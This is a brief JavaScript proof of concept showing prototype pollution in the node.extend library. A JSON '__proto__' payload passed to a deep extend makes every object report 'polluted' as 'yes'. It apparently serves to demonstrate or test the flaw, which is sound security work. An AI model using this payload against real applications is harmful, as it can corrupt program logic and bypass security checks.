var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
let extend = require('node.extend');
var obj = {};
console.log({}.polluted);
extend(true, obj, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);